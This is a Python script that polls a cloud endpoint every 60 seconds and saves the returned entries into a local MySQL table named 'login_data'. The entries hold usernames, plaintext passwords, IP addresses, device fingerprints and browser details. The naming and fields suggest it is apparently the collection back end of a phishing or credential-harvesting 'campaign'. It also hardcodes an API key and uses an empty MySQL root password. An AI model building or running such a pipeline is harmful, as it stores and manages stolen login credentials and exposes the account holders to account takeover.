"""
Local Sync Script - Fetch data from cloud to local MySQL database
Run this on your XAMPP server to automatically sync data
"""

import requests
import mysql.connector
from datetime import datetime
import time
import os
import json

# ============ CONFIGURATION ============
# Cloud server configuration
CLOUD_URL = "https://campaign-rzp2.onrender.com/api/fetch-entries"  # Change to your cloud URL
API_KEY = "abcdefghijklmnopnp2025"  # Must match the API_KEY in cloud app

# MySQL configuration (XAMPP default settings)
MYSQL_CONFIG = {
    'host': 'localhost',
    'user': 'root',          # Default XAMPP MySQL user
    'password': '',          # Default XAMPP MySQL password (empty)
    'database': 'pnp_data'   # Change to your database name
}

# Sync interval in seconds (default: 60 seconds = 1 minute)
SYNC_INTERVAL = 60

# File to store last sync timestamp
SYNC_TIMESTAMP_FILE = 'last_sync.txt'
# =======================================

def get_last_sync_timestamp():
    """Get the last sync timestamp from file"""
    if os.path.exists(SYNC_TIMESTAMP_FILE):
        try:
            with open(SYNC_TIMESTAMP_FILE, 'r') as f:
                return f.read().strip()
        except:
            pass
    return ''

def save_last_sync_timestamp(timestamp):
    """Save the last sync timestamp to file"""
    try:
        with open(SYNC_TIMESTAMP_FILE, 'w') as f:
            f.write(timestamp)
    except Exception as e:
        print(f"Error saving timestamp: {e}")

def create_database_and_table():
    """Create database and table if they don't exist"""
    try:
        # Connect without database first
        conn = mysql.connector.connect(
            host=MYSQL_CONFIG['host'],
            user=MYSQL_CONFIG['user'],
            password=MYSQL_CONFIG['password']
        )
        cursor = conn.cursor()
        
        # Create database if not exists
        cursor.execute(f"CREATE DATABASE IF NOT EXISTS {MYSQL_CONFIG['database']}")
        print(f"✓ Database '{MYSQL_CONFIG['database']}' ready")
        
        cursor.close()
        conn.close()
        
        # Now connect to the database
        conn = mysql.connector.connect(**MYSQL_CONFIG)
        cursor = conn.cursor()
        
        # Create table if not exists
        create_table_query = """
        CREATE TABLE IF NOT EXISTS login_data (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            timestamp VARCHAR(100) NOT NULL,
            ip_address VARCHAR(45),
            device_fingerprint VARCHAR(255),
            device_type VARCHAR(50),
            browser_info LONGTEXT,
            synced_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_timestamp (timestamp),
            INDEX idx_username (username),
            INDEX idx_ip_address (ip_address)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        """
        
        cursor.execute(create_table_query)
        conn.commit()
        print("✓ Table 'login_data' ready")
        
        cursor.close()
        conn.close()
        
        return True
        
    except mysql.connector.Error as err:
        print(f"✗ Database error: {err}")
        return False

def fetch_cloud_data(last_sync_timestamp):
    """Fetch new entries from cloud server"""
    try:
        headers = {
            'Authorization': f'Bearer {API_KEY}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'last_sync_timestamp': last_sync_timestamp
        }
        
        print(f"  📡 Connecting to: {CLOUD_URL}")
        response = requests.post(CLOUD_URL, headers=headers, json=payload, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            print(f"  ✓ Connected successfully. Response: {data.get('count', 0)} entries")
            return data
        elif response.status_code == 401:
            print("✗ Authentication failed. Check your API_KEY")
            return None
        elif response.status_code == 404:
            print("✗ API endpoint not found. Check CLOUD_URL")
            return None
        else:
            print(f"✗ Error fetching data: {response.status_code} - {response.text[:100]}")
            return None
            
    except requests.exceptions.Timeout:
        print("✗ Connection timeout. Cloud server may be unreachable.")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"✗ Connection error: {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"✗ Request error: {e}")
        return None

def save_to_database(entries):
    """Save entries to MySQL database"""
    if not entries:
        return 0
    
    try:
        conn = mysql.connector.connect(**MYSQL_CONFIG)
        cursor = conn.cursor()
        
        insert_query = """
        INSERT INTO login_data (username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
        VALUES (%s, %s, %s, %s, %s, %s, %s)
        ON DUPLICATE KEY UPDATE synced_at = CURRENT_TIMESTAMP
        """
        
        saved_count = 0
        failed_count = 0
        
        for entry in entries:
            try:
                # Convert browser_info dict to JSON string if needed
                browser_info = entry.get('browser_info', None)
                if isinstance(browser_info, dict):
                    browser_info = json.dumps(browser_info)
                
                cursor.execute(insert_query, (
                    entry.get('username', ''),
                    entry.get('password', ''),
                    entry.get('timestamp', ''),
                    entry.get('ip_address'),
                    entry.get('device_fingerprint'),
                    entry.get('device_type'),
                    browser_info
                ))
                saved_count += 1
            except mysql.connector.DatabaseError as err:
                failed_count += 1
                print(f"  ⚠ Failed to insert entry: {err}")
                continue
        
        conn.commit()
        cursor.close()
        conn.close()
        
        if failed_count > 0:
            print(f"  ⚠ {failed_count} entries failed to save")
        
        return saved_count
        
    except mysql.connector.Error as err:
        print(f"✗ Database connection error: {err}")
        return 0

def sync_data():
    """Main sync function"""
    print(f"\n[{datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}] Starting sync...")
    
    # Get last sync timestamp
    last_sync = get_last_sync_timestamp()
    if last_sync:
        print(f"  Last sync: {last_sync}")
    else:
        print("  First sync - fetching all data")
    
    # Fetch data from cloud
    result = fetch_cloud_data(last_sync)
    
    if result is None:
        print("✗ Sync failed - will retry next interval")
        return
    
    entries = result.get('entries', [])
    sync_timestamp = result.get('sync_timestamp', '')
    
    if not entries:
        print("✓ No new entries to sync")
        return
    
    print(f"  Found {len(entries)} new entries")
    
    # Save to database
    saved_count = save_to_database(entries)
    
    if saved_count > 0:
        print(f"✓ Saved {saved_count} entries to database")
        # Update last sync timestamp
        if sync_timestamp:
            save_last_sync_timestamp(sync_timestamp)
            print(f"  Updated sync timestamp: {sync_timestamp}")
    else:
        print("✗ No entries were saved (possibly duplicates)")

def main():
    """Main function to run continuous sync"""
    print("\n" + "=" * 70)
    print("   🔄 CLOUD TO LOCAL DATABASE SYNC")
    print("=" * 70)
    print(f"☁️  Cloud Server: {CLOUD_URL}")
    print(f"💾 Database: {MYSQL_CONFIG['user']}@{MYSQL_CONFIG['host']}/{MYSQL_CONFIG['database']}")
    print(f"⏱️  Sync interval: {SYNC_INTERVAL} seconds")
    print("=" * 70)
    
    # Create database and table if needed
    if not create_database_and_table():
        print("\n❌ Failed to setup database. Please check MySQL configuration and credentials.")
        print(f"   Host: {MYSQL_CONFIG['host']}")
        print(f"   User: {MYSQL_CONFIG['user']}")
        return
    
    print("\n✓ Setup complete. Starting sync loop...")
    print("  Press Ctrl+C to stop\n")
    
    try:
        while True:
            sync_data()
            time.sleep(SYNC_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n\n✓ Sync stopped by user")
    except Exception as e:
        print(f"\n✗ Unexpected error: {e}")

if __name__ == '__main__':
    main()